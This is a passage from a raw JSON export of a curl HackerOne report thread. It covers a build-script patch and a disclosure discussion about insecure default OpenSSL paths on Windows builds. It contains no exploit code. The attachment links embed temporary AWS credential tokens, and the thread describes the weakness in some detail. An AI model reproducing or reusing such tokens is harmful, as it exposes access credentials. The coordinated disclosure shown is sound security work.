\u0026lt;https://vszakats.net/\u0026gt;\n\u003cspan class=\"gi\"\u003e+# Copyright 2014-2019 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003c/span\u003e # See LICENSE.md\n\n export _NAM\n\u003cspan class=\"p\"\u003e@@ -68,10 +68,10 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n     options=\u0026quot;${options} -DZLIB_INCLUDE_DIR:PATH=$(pwd)/../zlib/pkg/usr/local/include\u0026quot;\n     options=\u0026quot;${options} -DZLIB_LIBRARY:FILEPATH=$(pwd)/../zlib/pkg/usr/local/lib/libz.a\u0026quot;\n     options=\u0026quot;${options} -DCRYPTO_BACKEND=OpenSSL\u0026quot;\n\u003cspan class=\"gd\"\u003e-    options=\u0026quot;${options} -DOPENSSL_ROOT_DIR=$(pwd)/../openssl/pkg/usr/local/\u0026quot;\n-    options=\u0026quot;${options} -DOPENSSL_INCLUDE_DIR=$(pwd)/../openssl/pkg/usr/local/include\u0026quot;\n-    options=\u0026quot;${options} -DOPENSSL_LIBRARIES=$(pwd)/../openssl/pkg/usr/local/lib\u0026quot;\n-    options=\u0026quot;${options} -DOPENSSL_CRYPTO_LIBRARY=$(pwd)/../openssl/pkg/usr/local/lib\u0026quot;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    options=\u0026quot;${options} -DOPENSSL_ROOT_DIR=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/\u0026quot;\n+    options=\u0026quot;${options} -DOPENSSL_INCLUDE_DIR=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/include\u0026quot;\n+    options=\u0026quot;${options} -DOPENSSL_LIBRARIES=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/lib\u0026quot;\n+    options=\u0026quot;${options} -DOPENSSL_CRYPTO_LIBRARY=$(pwd)/../openssl/pkg/C:/Windows/System32/OpenSSL/lib\u0026quot;\n\u003c/span\u003e     options=\u0026quot;${options} -DCMAKE_RC_COMPILER=${_CCPREFIX}windres\u0026quot;\n     options=\u0026quot;${options} -DCMAKE_INSTALL_MESSAGE=NEVER\u0026quot;\n     options=\u0026quot;${options} -DCMAKE_INSTALL_PREFIX=/usr/local\u0026quot;\n\u003cspan class=\"gh\"\u003ediff --git a/openssl.sh b/openssl.sh\nindex 6e2c01b..a70e627 100755\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/openssl.sh\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/openssl.sh\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1,6 +1,6 @@\u003c/span\u003e\n #!/bin/sh -ex\n\n-# Copyright 2014-2018 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003cspan class=\"gi\"\u003e+# Copyright 2014-2019 Viktor Szakats \u0026lt;https://vszakats.net/\u0026gt;\n\u003c/span\u003e # See LICENSE.md\n\n export _NAM\n\u003cspan class=\"p\"\u003e@@ -62,8 +62,20 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n   # AR=, NM=, RANLIB=\n   unset CC\n\n+  # Patch OpenSSL ./Configure to not abort when seeing a Windows\n\u003cspan class=\"gi\"\u003e+  # absolute path passed as --prefix. Without the patch it\n+  # misidentifies all Windows absolute paths as relative ones.\n+  sed \u0026#39;s|die \u0026quot;Directory given with --prefix|print \u0026quot;Directory given with --prefix|g\u0026#39; \\\n+    \u0026lt; ./Configure \u0026gt; ./Configure-patched\n+  chmod +x ./Configure-patched\n+\n+  # Space or backslash not allowed. Needs to be a folder restricted\n+  # to Administrators across majority of Windows installations, versions\n+  # and configurations.\n+  _prefix=\u0026#39;C:/Windows/System32/OpenSSL\u0026#39;\n+\n\u003c/span\u003e   # shellcheck disable=SC2086\n\u003cspan class=\"gd\"\u003e-  ./Configure ${options} shared \\\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  ./Configure-patched ${options} shared \\\n\u003c/span\u003e     \u0026quot;--cross-compile-prefix=${_CCPREFIX}\u0026quot; \\\n     -fno-ident \\\n     -Wl,--nxcompat -Wl,--dynamicbase \\\n\u003cspan class=\"p\"\u003e@@ -71,13 +83,14 @@\u003c/span\u003e _cpu=\u0026quot;$2\u0026quot;\n     no-idea \\\n     no-tests \\\n     no-makedepend \\\n\u003cspan class=\"gd\"\u003e-    \u0026#39;--prefix=/usr/local\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    \u0026quot;--prefix=${_prefix}\u0026quot;\n\u003c/span\u003e   SOURCE_DATE_EPOCH=${unixts} TZ=UTC make\n   # Install it so that it can be detected by CMake\n\u003cspan class=\"gd\"\u003e-  make install \u0026quot;DESTDIR=$(pwd)/pkg\u0026quot; \u0026gt; /dev/null # 2\u0026gt;\u0026amp;1\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  # (ending slash required)\n+  make install \u0026quot;DESTDIR=$(pwd)/pkg/\u0026quot; \u0026gt; /dev/null # 2\u0026gt;\u0026amp;1\n\u003c/span\u003e\n   # DESTDIR= + --prefix=\n\u003cspan class=\"gd\"\u003e-  _pkg=\u0026#39;pkg/usr/local\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  _pkg=\u0026quot;pkg/${_prefix}\u0026quot;\n\u003c/span\u003e\n   # Make steps for determinism\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-06-12T19:14:23.282Z","updated_at":"2019-06-12T19:15:29.455Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":507933,"filename":"curl-7.65.1_1patched-win32-mingw.zip","type":"application/zip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/933/f06f8fc01f55470e6c739aac97afdd7abf062503/curl-7.65.1_1patched-win32-mingw.zip?response-content-disposition=attachment%3B%20filename%3D%22curl-7.65.1_1patched-win32-mingw.zip%22%3B%20filename%2A%3DUTF-8%27%27curl-7.65.1_1patched-win32-mingw.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063008Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=d38403e9d36aac65f5347f90857b839255d3ab3adb993e448044bb5c03eb9d07"},{"id":507932,"filename":"curl-7.65.1_1patched-win64-mingw.zip","type":"application/zip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/507/932/68a33384310a76123363f3640341df2ad7060050/curl-7.65.1_1patched-win64-mingw.zip?response-content-disposition=attachment%3B%20filename%3D%22curl-7.65.1_1patched-win64-mingw.zip%22%3B%20filename%2A%3DUTF-8%27%27curl-7.65.1_1patched-win64-mingw.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063008Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=a591e6d4f083d7054e0f2d90130432acadba2c75099d53f2020e8a6bfa5b256e"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5074824,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Is it far fetched to say that the OpenSSL issue merits its own CVE and private report to OpenSSL maintainers?\n\nWe have early indications that other projects than us suffer from this exact same flaw as well, so yes I think it might be an idea to contact OpenSSL and discuss with them if they shouldn't modify the default paths for Windows builds to reduce or remove this risk by default.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eIs it far fetched to say that the OpenSSL issue merits its own CVE and private report to OpenSSL maintainers?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWe have early indications that other projects than us suffer from this exact same flaw as well, so yes I think it might be an idea to contact OpenSSL and discuss with them if they shouldn\u0026#39;t modify the default paths for Windows builds to reduce or remove this risk by default.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T21:16:09.310Z","updated_at":"2019-06-12T21:16:09.310Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5075166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"AFAICS a significant portion of existing OpenSSL/LibreSSL Windows binaries may suffer from this or related issues. All MinGW/GCC builds and all pre-OpenSSL 1.1.0 MSVC builds are likely vulnerable. The Windows-specific prefix defaulting logic for MSVC was committed on 2016-03-17: https://github.com/openssl/openssl/commit/8c16829ebd8de96334818b2bc5a5e314b001d18c\n\nThis specific vulnerability may be missing from builds with `no-engine` option, but all builds would still be hit by issues due to world-writable `openssl.cnf` and `cert.pem`.\n\nMy local copies (not the latest versions) of MSYS2 and Cygwin64 both seem affected, plus one LibreSSL (2.3.0) distro which I forget the origin.","markdown_message":"\u003cp\u003eAFAICS a significant portion of existing OpenSSL/LibreSSL Windows binaries may suffer from this or related issues. All MinGW/GCC builds and all pre-OpenSSL 1.1.0 MSVC builds are likely vulnerable. The Windows-specific prefix defaulting logic for MSVC was committed on 2016-03-17: \u003ca title=\"https://github.com/openssl/openssl/commit/8c16829ebd8de96334818b2bc5a5e314b001d18c\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fopenssl%2Fopenssl%2Fcommit%2F8c16829ebd8de96334818b2bc5a5e314b001d18c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/openssl/openssl/commit/8c16829ebd8de96334818b2bc5a5e314b001d18c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis specific vulnerability may be missing from builds with \u003ccode\u003eno-engine\u003c/code\u003e option, but all builds would still be hit by issues due to world-writable \u003ccode\u003eopenssl.cnf\u003c/code\u003e and \u003ccode\u003ecert.pem\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eMy local copies (not the latest versions) of MSYS2 and Cygwin64 both seem affected, plus one LibreSSL (2.3.0) distro which I forget the origin.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T21:56:05.298Z","updated_at":"2019-06-12T21:56:49.320Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5075312,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I did reach out to the OpenSSL project the other day. I received a reply from Matt Caswell this morning and they will be looking into it. I will share details as I receive them.\n\nI have researched various builds of the OpenSSL libraries and there is no consistent pattern on the build paths. Some if it definitely appears to be related to cross compiling workflows but I have also seen various custom paths used. In short, it's appears to be a big mess and difficult to definitively determine if a given library is vulnerable - even if an insecure build path is used without manual testing. It all depends on if the application attempts to load the openssl.cnf file. I have not been able to determine the root cause and have been tracking it as a per application issue. At this point my best guess is that it's a combination of issues. ","markdown_message":"\u003cp\u003eI did reach out to the OpenSSL project the other day. I received a reply from Matt Caswell this morning and they will be looking into it. I will share details as I receive them.\u003c/p\u003e\n\n\u003cp\u003eI have researched various builds of the OpenSSL libraries and there is no consistent pattern on the build paths. Some if it definitely appears to be related to cross compiling workflows but I have also seen various custom paths used. In short, it\u0026#39;s appears to be a big mess and difficult to definitively determine if a given library is vulnerable - even if an insecure build path is used without manual testing. It all depends on if the application attempts to load the openssl.cnf file. I have not been able to determine the root cause and have been tracking it as a per application issue. At this point my best guess is that it\u0026#39;s a combination of issues. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T22:33:16.690Z","updated_at":"2019-06-12T22:33:16.690Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5077529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just make sure that everyone we talk to is aware that we need to coordinate the disclosure to minimize user impact.","markdown_message":"\u003cp\u003eJust make sure that everyone we talk to is aware that we need to coordinate the disclosure to minimize user impact.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-13T07:32:36.473Z","updated_at":"2019-06-13T07:32:36.473Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5078454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm staying put for now regarding this; the fix is ready from my end and looking for any feedback regarding it. Once we LGTM this and confirm it fixes the issue, I can commit a new build revision any time.\n\nThe promise of curl-for-win is to use _unpatched_ sources or patches that have been submitted with a good chance to be accepted upstream, so something in effect of the OpenSSL configuration patch will need to be submitted, or raised as an issue with the OpenSSL team. When the upstream fix lands and gets released, curl-for-win will need to be adapted accordingly, dropping our local OpenSSL patch.\n","markdown_message":"\u003cp\u003eI\u0026#39;m staying put for now regarding this; the fix is ready from my end and looking for any feedback regarding it. Once we LGTM this and confirm it fixes the issue, I can commit a new build revision any time.\u003c/p\u003e\n\n\u003cp\u003eThe promise of curl-for-win is to use \u003cu\u003eunpatched\u003c/u\u003e sources or patches that have been submitted with a good chance to be accepted upstream, so something in effect of the OpenSSL configuration patch will need to be submitted, or raised as an issue with the OpenSSL team. When the upstream fix lands and gets released, curl-for-win will need to be adapted accordingly, dropping our local OpenSSL patch.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-13T08:54:57.084Z","updated_at":"2019-06-13T08:54:57.084Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5080784,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for staying on top of this @vsz. ","markdown_message":"\u003cp\u003eThanks for staying on top of this \u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-13T15:49:33.759Z","updated_at":"2019-06-13T15:49:33.759Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5081239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder @vsz @dgustafsson – I want to let you know the collective response to this issue within the first 24 hours has been impressive to watch. Thank you!","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e \u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e \u003ca href=\"/dgustafsson\"\u003e@dgustafsson\u003c/a\u003e – I want to let you know the collective response to this issue within the first 24 hours has been impressive to watch. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-13T16:43:36.058Z","updated_at":"2019-06-13T16:43:36.058Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5109253,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I'm leaving the severity at high for now at least.","markdown_message":"\u003cp\u003eI\u0026#39;m leaving the severity at high for now at least.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-16T20:54:11.811Z","updated_at":"2019-06-16T20:54:11.811Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5110213,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr, any word on how OpenSSL view this problem and how/if they want to address it? We're now trying to coordinate with postgres as well.","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e, any word on how OpenSSL view this problem and how/if they want to address it? We\u0026#39;re now trying to coordinate with postgres as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T06:02:05.771Z","updated_at":"2019-06-17T06:02:05.771Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5111242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One question, would it work if we changed OPENSSLDIR to a path which is guaranteed to never work for any installation? Ie one which contains characters which are banned from filenames in Windows?","markdown_message":"\u003cp\u003eOne question, would it work if we changed OPENSSLDIR to a path which is guaranteed to never work for any installation? Ie one which contains characters which are banned from filenames in Windows?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T08:33:54.219Z","updated_at":"2019-06-17T08:33:54.219Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5111577,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder I have not heard back since the initial response. I just replied requesting an update and asked how they will be addressing the issue. I will let you know when I receive a response.","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e I have not heard back since the initial response. I just replied requesting an update and asked how they will be addressing the issue. I will let you know when I receive a response.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T09:06:31.768Z","updated_at":"2019-06-17T09:06:31.768Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5112374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder I received an update from the OpenSSL project. They do not consider this a vulnerability in OpenSSL because they do not provide binary packages. No changes are planned at this time but they may add guidance to the build documentation.","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e I received an update from the OpenSSL project. They do not consider this a vulnerability in OpenSSL because they do not provide binary packages. No changes are planned at this time but they may add guidance to the build documentation.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T10:52:08.518Z","updated_at":"2019-06-17T10:52:08.518Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5112570,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The problem isn't that they distribute vulnerable binaries, but the fact that it is not possible to build secure binaries with their existing build system. (unless one is using MSVC to build OpenSSL 1.1.0 or above.)\n\nNot to mention that unsecure binaries are built with the default build settings on Windows (with the exception above.)\n\nIf they had enough reason to fix this for MSVC builds in 1.1.0, the same reasons apply to fix mingw*/cygwin builds as well, I'd be guessing.","markdown_message":"\u003cp\u003eThe problem isn\u0026#39;t that they distribute vulnerable binaries, but the fact that it is not possible to build secure binaries with their existing build system. (unless one is using MSVC to build OpenSSL 1.1.0 or above.)\u003c/p\u003e\n\n\u003cp\u003eNot to mention that unsecure binaries are built with the default build settings on Windows (with the exception above.)\u003c/p\u003e\n\n\u003cp\u003eIf they had enough reason to fix this for MSVC builds in 1.1.0, the same reasons apply to fix mingw*/cygwin builds as well, I\u0026#39;d be guessing.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T11:56:19.969Z","updated_at":"2019-06-17T12:01:00.431Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112600,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e **it is not possible to build secure binaries with their existing build system**\n\nYou should stress this point to them, as this actually is a problem in OpenSSL even if they don't ship binaries (see @vsz's patch above). They effectively make it difficult to have binaries to do the right thing instead of the opposite.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eit is not possible to build secure binaries with their existing build system\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYou should stress this point to them, as this actually is a problem in OpenSSL even if they don\u0026#39;t ship binaries (see \u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e\u0026#39;s patch above). They effectively make it difficult to have binaries to do the right thing instead of the opposite.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T12:03:53.844Z","updated_at":"2019-06-17T12:03:53.844Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5112790,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've also shot them an email to \u003copenssl-security@openssl.org\u003e just now.","markdown_message":"\u003cp\u003eI\u0026#39;ve also shot them an email to \u003ca title=\"openssl-security@openssl.org\" href=\"mailto:openssl-security@openssl.org\" rel=\"nofollow noopener noreferrer\"\u003eopenssl-security@openssl.org\u003c/a\u003e just 